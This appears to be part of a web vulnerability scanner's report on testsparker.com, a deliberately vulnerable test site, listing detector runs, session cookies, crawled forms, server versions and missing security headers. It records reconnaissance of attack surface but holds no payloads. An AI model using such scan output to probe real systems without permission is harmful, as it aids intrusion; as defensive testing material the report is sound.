+Batch #4 shell shock detector: estimated time < 1 minute (1 tests, 121 inputs)
+Batch #4 shell shock detector: 1 vulnsigs tests, completed 123  requests, 0 seconds. Completed 123 requests of 121 estimated requests (101.653%). All tests completed.
+Batch #4 shell shock detector(form): estimated time < 1 minute (1 tests, 11 inputs)
+Batch #4 shell shock detector(form): 1 vulnsigs tests, completed 11  requests, 0 seconds. Completed 11 requests of 11 estimated requests (100%). All tests completed.
+Batch #4 httpoxy detector: estimated time < 1 minute (1 tests, 143 inputs)
+Batch #4 httpoxy detector: 1 vulnsigs tests, completed 143  requests, 2 seconds. Completed 143 requests of 143 estimated requests (100%). All tests completed.
+Batch #4 httpoxy detector(form): estimated time < 1 minute (1 tests, 11 inputs)
+Batch #4 httpoxy detector(form): 1 vulnsigs tests, completed 11  requests, 0 seconds. Completed 11 requests of 11 estimated requests (100%). All tests completed.
+Batch #4 Struts timebased detector: estimated time < 1 minute (1 tests, 120 inputs)
+Batch #4 Struts timebased detector: 1 vulnsigs tests, completed 120  requests, 2 seconds. Completed 120 requests of 120 estimated requests (100%). All tests completed.
+Batch #4 Login Brute Force manipulation: estimated time < 1 minute (176 tests, 1 inputs)
+Batch #4 Login Brute Force manipulation: 176 vulnsigs tests, completed 176  requests, 1140 seconds. Completed 176 requests of 176 estimated requests (100%). All tests completed.
+Batch #5 HTTP Time Bandit: estimated time < 1 minute (1 tests, 10 inputs)
+Batch #5 HTTP Time Bandit: 1 vulnsigs tests, completed 200  requests, 3 seconds. No tests to execute.
+Path manipulation: Estimated requests (payloads x links): files with extension:(0 x 60) + files:(0 x 81) +  directories:(4 x 85) +  paths:(11 x 166) = total (2166) 
+Batch #5 Path XSS manipulation: estimated time < 1 minute (15 tests, 166 inputs)
+Batch #5 Path XSS manipulation: 15 vulnsigs tests, completed 1870  requests, 9 seconds. Completed 1870 requests of 2166 estimated requests (86.3343%). All tests completed.
+Path manipulation: Estimated requests (payloads x links): files with extension:(0 x 60) + files:(0 x 81) +  directories:(1 x 85) +  paths:(0 x 166) = total (85) 
+Batch #5 Tomcat Vuln manipulation: estimated time < 1 minute (1 tests, 166 inputs)
+Batch #5 Tomcat Vuln manipulation: 1 vulnsigs tests, completed 13  requests, 0 seconds. Completed 13 requests of 85 estimated requests (15.2941%). All tests completed.
+Path manipulation: Estimated requests (payloads x links): files with extension:(0 x 60) + files:(0 x 81) +  directories:(16 x 85) +  paths:(0 x 166) = total (1360) 
+Batch #5 Time based path manipulation: estimated time < 1 minute (16 tests, 208 inputs)
+Batch #5 Time based path manipulation: 16 vulnsigs tests, completed 80  requests, 1620 seconds. Completed 80 requests of 1360 estimated requests (5.88235%). All tests completed.
+Path manipulation: Estimated requests (payloads x links): files with extension:(4 x 60) + files:(18 x 81) +  directories:(102 x 85) +  paths:(14 x 166) = total (12692) 
+Batch #5 Path manipulation: estimated time < 10 minutes (138 tests, 166 inputs)
+Batch #5 Path manipulation: 138 vulnsigs tests, completed 9650  requests, 58 seconds. Completed 9650 requests of 12692 estimated requests (76.0321%). All tests completed.
+Generic WebCgi Test no test enabled
+Total requests made: 27222
+Average server response time: 0.04 seconds
+","24 Apr 2019 01:41AM GMT"
+"INFORMATION_GATHERED","78419205","1066431","150101","Total cookies: 3
+ASP.NET_SessionId=mhtebv2qhibfwkcqjtvkxzdj; HttpOnly; path=/ First set at URL: http://aspnet.testsparker.com/
+TestCookie=Hello; path=/ First set at URL: http://aspnet.testsparker.com/
+PHPSESSID=375a1719e219e711f342095cfe2a9d4f; path=/ First set at URL: http://php.testsparker.com/auth/login.php
+","24 Apr 2019 01:41AM GMT"
+"INFORMATION_GATHERED","78419199","1027724","150152","Total internal forms seen (this count includes duplicate forms): 86
+
+Crawled forms (Total: 11)
+NOTE: This does not include authentication forms. Authentication forms are reported separately in QID 150115
+Form #:1 Action URI:http://aspnet.testsparker.com/
+Form Fields: __VIEWSTATE, __VIEWSTATEGENERATOR
+
+Form #:2 Action URI:http://php.testsparker.com/artist.php
+Form Fields: id
+
+Form #:3 Action URI:http://aspnet.testsparker.com/Blogs.aspx
+Form Fields: __VIEWSTATE, __VIEWSTATEGENERATOR, __VIEWSTATEENCRYPTED
+
+Form #:4 Action URI:http://aspnet.testsparker.com/ConverterResponse.aspx
+Form Fields: __VIEWSTATE, __VIEWSTATEGENERATOR, ctl00$contentTop$converterAjaxJsonSqjInjection$txtBtcAmount, ctl00$contentTop$converterAjaxJsonSqjInjection$txtBtcText and 3 more field(s).
+
+Form #:5 Action URI:http://aspnet.testsparker.com/Request.aspx?r=%2Fstatics%2Fdownload%2F
+Form Fields: Name, Email
+
+Form #:6 Action URI:http://aspnet.testsparker.com/Contact.aspx
+Form Fields: __VIEWSTATE, __VIEWSTATEGENERATOR, ctl00$contentCenterMenu$contact$txtMail, ctl00$contentCenterMenu$contact$txtMessage, ctl00$contentCenterMenu$contact$btnSend and 0 more field(s).
+
+Form #:7 Action URI:http://aspnet.testsparker.com/Guestbook.aspx
+Form Fields: __VIEWSTATE, __VIEWSTATEGENERATOR, ctl00$contentTop$guestbookPermenantCrossSiteScripting$txtName, ctl00$contentTop$guestbookPermenantCrossSiteScripting$txtComment and 1 more field(s).
+
+Form #:8 Action URI:http://php.testsparker.com/nslookup.php
+Form Fields: param
+
+Form #:9 Action URI:http://angular.testsparker.com/
+Form Fields: email, range
+
+Form #:10 Action URI:http://angular.testsparker.com/
+Form Fields: certificate
+
+Form #:11 Action URI:http://php.testsparker.com/artist.php
+Form Fields: s
+
+NOTE: Forms with exactly the same form fields were considered identical even if they had different action URI. Only one such form is crawled, the other forms with exactly the same form fields are considered duplicate and are not crawled. If they are different forms and each of them should be crawled then change the scan settings accordingly.
+
+The following forms were not crawled as their fields matched Form #1 above:
+Form action: http://aspnet.testsparker.com/Default.aspx
+Form action: http://aspnet.testsparker.com/Request.aspx?r=%2fstatics%2fdownload%2f
+Form action: http://aspnet.testsparker.com/Help.aspx
+Form action: http://aspnet.testsparker.com/About.aspx?hello=visitor
+Form action: http://aspnet.testsparker.com/statics/download/
+Form action: http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-82/
+Form action: http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-62/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-really-used-by-people-71/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-fully-virtual-and-immaterial-74/
+Form action: http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-92/
+Form action: http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-77/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-fully-virtual-and-immaterial-89/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-anonymous-45/
+Form action: http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-42/
+Form action: http://aspnet.testsparker.com/blog/how-does-bitcoin-work-43/
+Form action: http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-72/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-fully-virtual-and-immaterial-69/
+Form action: http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-67/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-anonymous-55/
+Form action: http://aspnet.testsparker.com/blog/how-does-bitcoin-work-63/
+Form action: http://aspnet.testsparker.com/blog/how-does-bitcoin-work-73/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-anonymous-80/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-fully-virtual-and-immaterial-44/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-fully-virtual-and-immaterial-54/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-anonymous-95/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-really-used-by-people-36/
+Form action: http://aspnet.testsparker.com/blog/how-does-bitcoin-work-53/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-fully-virtual-and-immaterial-39/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-anonymous-70/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-really-used-by-people-51/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-anonymous-75/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-anonymous-65/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-really-used-by-people-56/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-anonymous-40/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-anonymous-85/
+Form action: http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-52/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-anonymous-50/
+Form action: http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-37/
+Form action: http://aspnet.testsparker.com/blog/how-does-bitcoin-work-58/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-fully-virtual-and-immaterial-64/
+Form action: http://aspnet.testsparker.com/blog/how-does-bitcoin-work-38/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-really-used-by-people-41/
+Form action: http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-57/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-really-used-by-people-61/
+Form action: http://aspnet.testsparker.com/blog/how-does-bitcoin-work-78/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-fully-virtual-and-immaterial-49/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-fully-virtual-and-immaterial-84/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-really-used-by-people-81/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-really-used-by-people-66/
+Form action: http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-87/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-really-used-by-people-91/
+Form action: http://aspnet.testsparker.com/blog/how-does-bitcoin-work-68/
+Form action: http://aspnet.testsparker.com/blog/how-does-bitcoin-work-83/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-really-used-by-people-86/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-really-used-by-people-76/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-really-used-by-people-46/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-anonymous-90/
+Form action: http://aspnet.testsparker.com/blog/how-does-bitcoin-work-93/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-fully-virtual-and-immaterial-94/
+Form action: http://aspnet.testsparker.com/blog/how-does-bitcoin-work-48/
+Form action: http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-47/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-fully-virtual-and-immaterial-79/
+Form action: http://aspnet.testsparker.com/blog/how-does-bitcoin-work-88/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-anonymous-60/
+Form action: http://aspnet.testsparker.com/blog/is-bitcoin-fully-virtual-and-immaterial-59/
+Form action: http://aspnet.testsparker.com/Products.aspx?pId=3
+Form action: http://aspnet.testsparker.com/Products.aspx?pId=4
+Form action: http://aspnet.testsparker.com/Pricings.aspx
+Form action: http://aspnet.testsparker.com/Help.aspx?item=help-konu1.html
+Form action: http://aspnet.testsparker.com/administrator/?r=%2fDashboard%2f
+Form action: http://aspnet.testsparker.com/Pricings.aspx?edition=std
+Form action: http://aspnet.testsparker.com/Pricings.aspx?edition=pro
+Form action: http://aspnet.testsparker.com/administrator/?r=%2fDashboard%2f&newAuth=1
+
+The following forms were not crawled as their fields matched Form #3 above:
+Form action: http://aspnet.testsparker.com/Shop.aspx
+Form action: http://aspnet.testsparker.com/GuestbookList.aspx
+","24 Apr 2019 01:41AM GMT"
+"INFORMATION_GATHERED","78419213","1027727","150206","
+Content-Security-Policy: Header missing
+Response headers on link: GET http://testsparker.com/ response code: 200
+Content-Type: text/html
+Content-Encoding: gzip
+Last-Modified: Fri, 22 Mar 2019 13:44:43 GMT
+Accept-Ranges: bytes
+Etag: ""80d77467b5e0d41:0""
+Vary: Accept-Encoding
+Server: Microsoft-IIS/8.5
+X-Powered-By: ASP.NET
+Date: Wed, 24 Apr 2019 01:41:36 GMT
+
+Header missing on the following link(s):
+(Only first 50 such pages are listed)
+
+GET http://testsparker.com/ response code: 200
+GET http://aspnet.testsparker.com/ response code: 200
+GET http://php.testsparker.com/ response code: 200
+GET http://angular.testsparker.com/ response code: 200
+GET http://php.testsparker.com/artist.php?id=1 response code: 200
+GET http://aspnet.testsparker.com/statics/style.css response code: 200
+GET http://aspnet.testsparker.com/Default.aspx response code: 200
+GET http://aspnet.testsparker.com/Blogs.aspx response code: 200
+GET http://aspnet.testsparker.com/Shop.aspx response code: 200
+GET http://aspnet.testsparker.com/Converter.aspx response code: 200
+GET http://aspnet.testsparker.com/Request.aspx?r=%2Fstatics%2Fdownload%2F response code: 200
+POST http://aspnet.testsparker.com/statics/download/ response code: 200
+GET http://aspnet.testsparker.com/Help.aspx response code: 200
+GET http://aspnet.testsparker.com/Contact.aspx response code: 200
+GET http://aspnet.testsparker.com/Guestbook.aspx response code: 200
+GET http://aspnet.testsparker.com/Generics/FormString.asp response code: 404
+GET http://aspnet.testsparker.com/favicon.ico response code: 404
+GET http://aspnet.testsparker.com/About.aspx?hello=visitor response code: 200
+GET http://php.testsparker.com/process.php?file=Generics/index.nsp response code: 200
+GET http://php.testsparker.com/process.php?file=Generics/contact.nsp response code: 200
+GET http://php.testsparker.com/process.php?file=Generics/about.nsp response code: 200
+GET http://php.testsparker.com/hello.php?name=Visitor response code: 200
+GET http://php.testsparker.com/artist.php?id=test response code: 200
+GET http://php.testsparker.com/nslookup.php response code: 200
+GET http://php.testsparker.com/style.css response code: 200
+GET http://php.testsparker.com/products.php?pro=url response code: 200
+GET http://php.testsparker.com/favicon.ico response code: 404
+GET http://php.testsparker.com/images/footer-bg.gif response code: 200
+GET http://php.testsparker.com/images/img02.gif response code: 200
+GET http://php.testsparker.com/images/img01.gif response code: 200
+GET http://php.testsparker.com/images/main-slideshow-no-flash.jpg response code: 200
+GET http://php.testsparker.com/images/img03.gif response code: 200
+GET http://angular.testsparker.com/favicon.ico response code: 200
+GET http://angular.testsparker.com/assets/jquery-ui/jquery-ui.min.css response code: 200
+GET http://angular.testsparker.com/assets/select2/select2.min.css response code: 200
+GET http://angular.testsparker.com/assets/bootstrap/css/bootstrap.min.css response code: 200
+GET http://angular.testsparker.com/assets/ng-select/material.theme.css response code: 200
+GET http://angular.testsparker.com/assets/jquery-1.12.1.min.js response code: 200
+GET http://angular.testsparker.com/assets/bootstrap/js/bootstrap.min.js response code: 200
+GET http://angular.testsparker.com/assets/jquery-ui/jquery-ui.min.js response code: 200
+GET http://angular.testsparker.com/styles.2d4c4e9c161b36377f6f.bundle.css response code: 200
+GET http://angular.testsparker.com/assets/select2/select2.min.js response code: 200
+GET http://angular.testsparker.com/inline.318b50c57b4eba3d437b.bundle.js response code: 200
+GET http://angular.testsparker.com/polyfills.1ab4c7836bc0ed44dbb7.bundle.js response code: 200
+GET http://angular.testsparker.com/scripts.44b928e8fa0a1a3dd8c0.bundle.js response code: 200
+GET http://angular.testsparker.com/main.fbe5fbd112683a8c2d92.bundle.js response code: 200
+GET http://angular.testsparker.com/contact response code: 200
+GET http://angular.testsparker.com/results response code: 200
+GET http://angular.testsparker.com/components response code: 200
+GET http://angular.testsparker.com/docs response code: 200
+","24 Apr 2019 01:41AM GMT"
+"INFORMATION_GATHERED","78419202","1027729","45038","Scan duration: 3949 seconds
+
+Start time: Wed, Apr 24 2019, 01:07:16 GMT
+
+End time: Wed, Apr 24 2019, 02:13:05 GMT
+","24 Apr 2019 01:41AM GMT"
+"INFORMATION_GATHERED","78419192","1066422","150210","One or more response headers disclosing information about the application platform were present on the following pages:
+(Only first 50 such pages are reported)
+
+GET http://testsparker.com/ response code: 200
+Server: Microsoft-IIS/8.5
+X-Powered-By: ASP.NET
+
+GET http://aspnet.testsparker.com/ response code: 200
+Server: Microsoft-IIS/8.5
+X-Powered-By: ASP.NET
+X-Aspnet-Version: 4.0.30319
+
+GET http://php.testsparker.com/ response code: 200
+Server: Apache/2.2.8 (Win32) PHP/5.2.6
+X-Powered-By: PHP/5.2.6
+
+GET http://angular.testsparker.com/ response code: 200
+Server: Apache/2.4.29 (Ubuntu)
+
+GET http://php.testsparker.com/artist.php?id=1 response code: 200
+Server: Apache/2.2.8 (Win32) PHP/5.2.6
+X-Powered-By: PHP/5.2.6
+
+GET http://aspnet.testsparker.com/statics/style.css response code: 200
+Server: Microsoft-IIS/8.5
+X-Powered-By: ASP.NET
+
+GET http://aspnet.testsparker.com/Default.aspx response code: 200
+Server: Microsoft-IIS/8.5
+X-Powered-By: ASP.NET
+X-Aspnet-Version: 4.0.30319
+
+GET http://aspnet.testsparker.com/Blogs.aspx response code: 200
+Server: Microsoft-IIS/8.5
+X-Powered-By: ASP.NET
+X-Aspnet-Version: 4.0.30319
+
+GET http://aspnet.testsparker.com/Shop.aspx response code: 200
+Server: Microsoft-IIS/8.5
+X-Powered-By: ASP.NET
+X-Aspnet-Version: 4.0.30319
+
+GET http://aspnet.testsparker.com/Converter.aspx response code: 200
+Server: Microsoft-IIS/8.5
+X-Powered-By: ASP.NET
+X-Aspnet-Version: 4.0.30319
+
+GET http://aspnet.testsparker.com/Request.aspx?r=%2Fstatics%2Fdownload%2F response code: 200
+Server: Microsoft-IIS/8.5
+X-Powered-By: ASP.NET
+X-Aspnet-Version: 4.0.30319
+
+POST http://aspnet.testsparker.com/statics/download/ response code: 200
+Server: Microsoft-IIS/8.5
+X-Powered-By: ASP.NET
+X-Aspnet-Version: 4.0.30319
+
+GET http://aspnet.testsparker.com/Help.aspx response code: 200
+Server: Microsoft-IIS/8.5
+X-Powered-By: ASP.NET
+X-Aspnet-Version: 4.0.30319
+
+GET http://aspnet.testsparker.com/Contact.aspx response code: 200
+Server: Microsoft-IIS/8.5
+X-Powered-By: ASP.NET
+X-Aspnet-Version: 4.0.30319
+
+GET http://aspnet.testsparker.com/administrator/ response code: 302
+Server: Microsoft-IIS/8.5
+X-Powered-By: ASP.NET
+X-Aspnet-Version: 4.0.30319
+
+GET http://aspnet.testsparker.com/Guestbook.aspx response code: 200
+Server: Microsoft-IIS/8.5
+X-Powered-By: ASP.NET
+X-Aspnet-Version: 4.0.30319
+
+GET http://aspnet.testsparker.com/Generics/FormString.asp response code: 404
+Server: Microsoft-IIS/8.5
+X-Powered-By: ASP.NET
+
+GET http://aspnet.testsparker.com/redirect.aspx?site=bitcoin.org response code: 302
+Server: Microsoft-IIS/8.5
+X-Powered-By: ASP.NET
+X-Aspnet-Version: 4.0.30319
+
+GET http://aspnet.testsparker.com/favicon.ico response code: 404
+Server: Microsoft-IIS/8.5
+X-Powered-By: ASP.NET
+
+GET http://aspnet.testsparker.com/About.aspx?hello=visitor response code: 200
+Server: Microsoft-IIS/8.5
+X-Powered-By: ASP.NET
+X-Aspnet-Version: 4.0.30319
+
+GET http://php.testsparker.com/process.php?file=Generics/index.nsp response code: 200
+Server: Apache/2.2.8 (Win32) PHP/5.2.6
+X-Powered-By: PHP/5.2.6
+
+GET http://php.testsparker.com/process.php?file=Generics/contact.nsp response code: 200
+Server: Apache/2.2.8 (Win32) PHP/5.2.6
+X-Powered-By: PHP/5.2.6
+
+GET http://php.testsparker.com/process.php?file=Generics/about.nsp response code: 200
+Server: Apache/2.2.8 (Win32) PHP/5.2.6
+X-Powered-By: PHP/5.2.6
+
+GET http://php.testsparker.com/hello.php?name=Visitor response code: 200
+Server: Apache/2.2.8 (Win32) PHP/5.2.6
+X-Powered-By: PHP/5.2.6
+
+GET http://php.testsparker.com/auth/ response code: 302
+Server: Apache/2.2.8 (Win32) PHP/5.2.6
+X-Powered-By: PHP/5.2.6
+
+GET http://php.testsparker.com/artist.php?id=test response code: 200
+Server: Apache/2.2.8 (Win32) PHP/5.2.6
+X-Powered-By: PHP/5.2.6
+
+GET http://php.testsparker.com/nslookup.php response code: 200
+Server: Apache/2.2.8 (Win32) PHP/5.2.6
+X-Powered-By: PHP/5.2.6
+
+GET http://php.testsparker.com/style.css response code: 200
+Server: Apache/2.2.8 (Win32) PHP/5.2.6
+
+GET http://php.testsparker.com/products.php?pro=url response code: 200
+Server: Apache/2.2.8 (Win32) PHP/5.2.6
+X-Powered-By: PHP/5.2.6
+
+GET http://php.testsparker.com/favicon.ico response code: 404
+Server: Apache/2.2.8 (Win32) PHP/5.2.6
+
+GET http://php.testsparker.com/images/footer-bg.gif response code: 200
+Server: Apache/2.2.8 (Win32) PHP/5.2.6
+
+GET http://php.testsparker.com/images/img02.gif response code: 200
+Server: Apache/2.2.8 (Win32) PHP/5.2.6
+
+GET http://php.testsparker.com/images/img01.gif response code: 200
+Server: Apache/2.2.8 (Win32) PHP/5.2.6
+
+GET http://php.testsparker.com/images/main-slideshow-no-flash.jpg response code: 200
+Server: Apache/2.2.8 (Win32) PHP/5.2.6
+
+GET http://php.testsparker.com/images/img03.gif response code: 200
+Server: Apache/2.2.8 (Win32) PHP/5.2.6
+
+GET http://angular.testsparker.com/favicon.ico response code: 200
+Server: Apache/2.4.29 (Ubuntu)
+
+GET http://angular.testsparker.com/assets/jquery-ui/jquery-ui.min.css response code: 200
+Server: Apache/2.4.29 (Ubuntu)
+
+GET http://angular.testsparker.com/assets/bootstrap/css/bootstrap.min.css response code: 200
+Server: Apache/2.4.29 (Ubuntu)
+
+GET http://angular.testsparker.com/assets/select2/select2.min.css response code: 200
+Server: Apache/2.4.29 (Ubuntu)
+
+GET http://angular.testsparker.com/assets/jquery-1.12.1.min.js response code: 200
+Server: Apache/2.4.29 (Ubuntu)
+
+GET http://angular.testsparker.com/assets/ng-select/material.theme.css response code: 200
+Server: Apache/2.4.29 (Ubuntu)
+
+GET http://angular.testsparker.com/assets/jquery-ui/jquery-ui.min.js response code: 200
+Server: Apache/2.4.29 (Ubuntu)
+
+GET http://angular.testsparker.com/assets/bootstrap/js/bootstrap.min.js response code: 200
+Server: Apache/2.4.29 (Ubuntu)
+
+GET http://angular.testsparker.com/assets/select2/select2.min.js response code: 200
+Server: Apache/2.4.29 (Ubuntu)
+
+GET http://angular.testsparker.com/styles.2d4c4e9c161b36377f6f.bundle.css response code: 200
+Server: Apache/2.4.29 (Ubuntu)
+
+GET http://angular.testsparker.com/inline.318b50c57b4eba3d437b.bundle.js response code: 200
+Server: Apache/2.4.29 (Ubuntu)
+
+GET http://angular.testsparker.com/polyfills.1ab4c7836bc0ed44dbb7.bundle.js response code: 200
+Server: Apache/2.4.29 (Ubuntu)
+
+GET http://angular.testsparker.com/main.fbe5fbd112683a8c2d92.bundle.js response code: 200
+Server: Apache/2.4.29 (Ubuntu)
+
+GET http://angular.testsparker.com/scripts.44b928e8fa0a1a3dd8c0.bundle.js response code: 200
+Server: Apache/2.4.29 (Ubuntu)
+
+GET http://angular.testsparker.com/contact response code: 200
+Server: Apache/2.4.29 (Ubuntu)
+
+","24 Apr 2019 01:41AM GMT"
+"INFORMATION_GATHERED","78419214","1027728","150204","
+X-Xss-Protection: Header missing
+Response headers on link: GET http://testsparker.com/ response code: 200
+Content-Type: text/html
+Content-Encoding: gzip
+Last-Modified: Fri, 22 Mar 2019 13:44:43 GMT
+Accept-Ranges: bytes
+Etag: ""80d77467b5e0d41:0""
+Vary: Accept-Encoding
+Server: Microsoft-IIS/8.5
+X-Powered-By: ASP.NET
+Date: Wed, 24 Apr 2019 01:41:36 GMT
+
+Header missing on the following link(s):
+(Only first 50 such pages are listed)
+
+GET http://testsparker.com/ response code: 200
+GET http://aspnet.testsparker.com/ response code: 200
+GET http://php.testsparker.com/ response code: 200
+GET http://angular.testsparker.com/ response code: 200
+GET http://php.testsparker.com/artist.php?id=1 response code: 200
+GET http://aspnet.testsparker.com/Default.aspx response code: 200
+GET http://aspnet.testsparker.com/Blogs.aspx response code: 200
+GET http://aspnet.testsparker.com/Shop.aspx response code: 200
+GET http://aspnet.testsparker.com/Converter.aspx response code: 200
+GET http://aspnet.testsparker.com/Request.aspx?r=%2Fstatics%2Fdownload%2F response code: 200
+POST http://aspnet.testsparker.com/statics/download/ response code: 200
+GET http://aspnet.testsparker.com/Help.aspx response code: 200
+GET http://aspnet.testsparker.com/Contact.aspx response code: 200
+GET http://aspnet.testsparker.com/Guestbook.aspx response code: 200
+GET http://aspnet.testsparker.com/favicon.ico response code: 404
+GET http://aspnet.testsparker.com/About.aspx?hello=visitor response code: 200
+GET http://php.testsparker.com/process.php?file=Generics/index.nsp response code: 200
+GET http://php.testsparker.com/process.php?file=Generics/contact.nsp response code: 200
+GET http://php.testsparker.com/process.php?file=Generics/about.nsp response code: 200
+GET http://php.testsparker.com/hello.php?name=Visitor response code: 200
+GET http://php.testsparker.com/artist.php?id=test response code: 200
+GET http://php.testsparker.com/nslookup.php response code: 200
+GET http://php.testsparker.com/products.php?pro=url response code: 200
+GET http://php.testsparker.com/favicon.ico response code: 404
+GET http://angular.testsparker.com/contact response code: 200
+GET http://angular.testsparker.com/results response code: 200
+GET http://angular.testsparker.com/components response code: 200
+GET http://angular.testsparker.com/docs response code: 200
+GET http://angular.testsparker.com/?email=was@qualys.com&range=John response code: 200
+GET http://angular.testsparker.com/languages response code: 200
+GET http://angular.testsparker.com/activity response code: 200
+GET http://angular.testsparker.com/home response code: 200
+GET http://angular.testsparker.com/extras response code: 200
+GET http://php.testsparker.com/artist.php response code: 200
+GET http://php.testsparker.com/Generics/style.css response code: 404
+GET http://angular.testsparker.com/?certificate=1 response code: 200
+GET http://aspnet.testsparker.com/statics/data.mdb response code: 200
+GET http://aspnet.testsparker.com/statics/help-konu1.html response code: 200
+GET http://aspnet.testsparker.com/statics/help-yes.html response code: 200
+GET http://aspnet.testsparker.com/statics/Web.config response code: 404
+GET http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-82/ response code: 200
+GET http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-62/ response code: 200
+GET http://aspnet.testsparker.com/blog/is-bitcoin-really-used-by-people-71/ response code: 200
+GET http://aspnet.testsparker.com/blog/is-bitcoin-fully-virtual-and-immaterial-74/ response code: 200
+GET http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-92/ response code: 200
+GET http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-77/ response code: 200
+GET http://aspnet.testsparker.com/blog/is-bitcoin-fully-virtual-and-immaterial-89/ response code: 200
+GET http://aspnet.testsparker.com/blog/is-bitcoin-anonymous-45/ response code: 404
+GET http://aspnet.testsparker.com/blog/what-are-the-advantages-of-bitcoin-42/ response code: 404
+GET http://aspnet.testsparker.com/blog/how-does-bitcoin-work-43/ response code: 404
+","24 Apr 2019 01:41AM GMT"
+"INFORMATION_GATHERED","78419207","1027722","150202","
+X-Content-Type-Options: Header missing
+Response headers on link: GET http://testsparker.com/ response code: 200
+Content-Type: text/html
+Content-Encoding: gzip
+Last-Modified: Fri, 22 Mar 2019 13:44:43 GMT
+Accept-Ranges: bytes
+Etag: ""80d77467b5e0d41:0""
+Vary: Accept-Encoding
+Server: Microsoft-IIS/8.5
+X-Powered-By: ASP.NET
+Date: Wed, 24 Apr 2019 01:41:36 GMT
+
+Header missing on the following link(s):
+(Only first 50 such pages are listed)
+
+GET http://testsparker.com/ response code: 200
+GET http://aspnet.testsparker.com/ response code: 200
+GET http://php.testsparker.com/ response code: 200
+GET http://angular.testsparker.com/ response code: 200
+GET http://php.testsparker.com/artist.php?id=1 response code: 200
+GET http://aspnet.testsparker.com/statics/style.css response code: 200
+GET http://aspnet.testsparker.com/Default.aspx response code: 200
+GET http://aspnet.testsparker.com/Blogs.aspx response code: 200
+GET http://aspnet.testsparker.com/Shop.aspx response code: 200
+GET http://aspnet.testsparker.com/Converter.aspx response code: 200
+GET http://aspnet.testsparker.com/Request.aspx?r=%2Fstatics%2Fdownload%2F response code: 200
+POST http://aspnet.testsparker.com/statics/download/ response code: 200
+GET http://aspnet.testsparker.com/Help.aspx response code: 200
+GET http://aspnet.testsparker.com/Contact.aspx response code: 200
+GET http://aspnet.testsparker.com/Guestbook.aspx response code: 200
+GET http://aspnet.testsparker.com/Generics/FormString.asp response code: 404
+GET http://aspnet.testsparker.com/favicon.ico response code: 404
+GET http://aspnet.testsparker.com/About.aspx?hello=visitor response code: 200
+GET http://php.testsparker.com/process.php?file=Generics/index.nsp response code: 200
+GET http://php.testsparker.com/process.php?file=Generics/contact.nsp response code: 200
+GET http://php.testsparker.com/process.php?file=Generics/about.nsp response code: 200
+GET http://php.testsparker.com/hello.php?name=Visitor response code: 200
+GET http://php.testsparker.com/artist.php?id=test response code: 200
+GET http://php.testsparker.com/nslookup.php response code: 200
+GET http://php.testsparker.com/style.css response code: 200
+GET http://php.testsparker.com/products.php?pro=url response code: 200
+GET http://php.testsparker.com/favicon.ico response code: 404
+GET http://php.testsparker.com/images/footer-bg.gif response code: 200
+GET http://php.testsparker.com/images/img02.gif response code: 200
+GET http://php.testsparker.com/images/img01.gif response code: 200
+GET http://php.testsparker.com/images/main-slideshow-no-flash.jpg response code: 200
+GET http://php.testsparker.com/images/img03.gif response code: 200
+GET http://angular.testsparker.com/favicon.ico response code: 200
+GET http://angular.testsparker.com/assets/jquery-ui/jquery-ui.min.css response code: 200
+GET http://angular.testsparker.com/assets/bootstrap/css/bootstrap.min.css response code: 200
+GET http://angular.testsparker.com/assets/select2/select2.min.css response code: 200
+GET http://angular.testsparker.com/assets/jquery-1.12.1.min.js response code: 200
+GET http://angular.testsparker.com/assets/ng-select/material.theme.css response code: 200
+GET http://angular.testsparker.com/assets/jquery-ui/jquery-ui.min.js response code: 200
